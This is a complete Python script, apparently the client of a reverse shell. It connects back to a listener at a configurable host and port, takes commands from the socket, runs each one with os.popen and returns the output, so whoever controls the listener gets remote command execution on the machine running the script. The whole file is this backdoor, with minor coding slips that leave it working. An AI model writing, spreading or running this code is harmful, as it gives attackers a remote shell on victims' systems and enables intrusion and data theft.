#!/usr/bin/env python3
import socket
import sys
from os import popen
from os import error as osError
global connect_tries 
connect_tries = 0
def create_socket():
	try :
		global s
		global host
		global port
		# the host and port variables should be the same as in server.py
		host = "localhost" #your ip address             
		port = 9990 #the port your want to listen to
		# the host and port variables should be the same as in server.py
		s = socket.socket()
		print("socket created")
	except socket.error as r:
		print("error creating socket :\nMessage : {}".format(e))

def connect_socket():
	try :
		global s
		global host
		global port
		global connect_tries
		if connect_tries == 0 : connect_tries = 0
		connect_tries += 1
		s.connect((host,port))
		shell()
	except socket.error as e :
		print("error connecting to {}:{}\nMessage:{}".format(host,port,e))
		if connect_tries < 5 :
			print("retrying....({})".format(connect_tries))
			connect_socket()
def shell():
	run = 1
	while run:

		try :
			global m
			m = 0
			cmd = str(s.recv(1024),"utf-8")
			if cmd == "exit" or cmd =="quit": break
			else : res = popen(cmd).read()
			if not str(res) : res = 'probably an error occured'
			s.send(str.encode(res))
		except Exception as e:
			err = "error:\nMessage:{}".format(e)
			s.send(str.encode(err))

		except socket.error as e:
			print("Network error\nMessage:{}".format(e))
create_socket()
connect_socket()

